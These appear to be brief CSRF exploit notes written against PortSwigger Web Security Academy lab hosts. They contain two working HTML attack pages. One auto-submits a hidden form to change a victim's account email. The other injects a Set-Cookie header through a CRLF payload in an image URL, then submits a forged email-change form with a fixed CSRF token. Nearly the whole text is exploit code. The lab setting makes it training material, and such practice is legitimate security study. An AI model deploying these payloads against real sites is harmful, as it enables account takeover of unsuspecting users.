- - - 
This is the easiest example
```html
<html>
	<body>
		<form method="POST" id="csrfForm" action="https://vulnerable.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="0xPelamar@proton.me" />
		</form>
		<script>
			document.getElementById('csrfForm').submit();
		</script>
	</body>
</html>
```
- - - 
In this attack, we first set a cookie in the victim browser and do a CSRF Attack
This case is about "**CSRF token is not tied to the user session**"
```html
<html>
<body>
	<img src="https://lab.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=token%3b%20SameSite=None" onerror="document.forms[0].submit()">
		<form method="POST" id="csrfForm" action="https://lab.web-security-academy.net/my-account/change-email">
		<input type="hidden" name="email" value="0xPelamar@what.ever" />
		<input type="hidden" name="csrf" value="Lj9831HxzIH7Dwx8a3Izv6kPdlydfuhM" />
		<input type="submit" value="Submit request">
		</form>
</body>
</html>
```
- - -
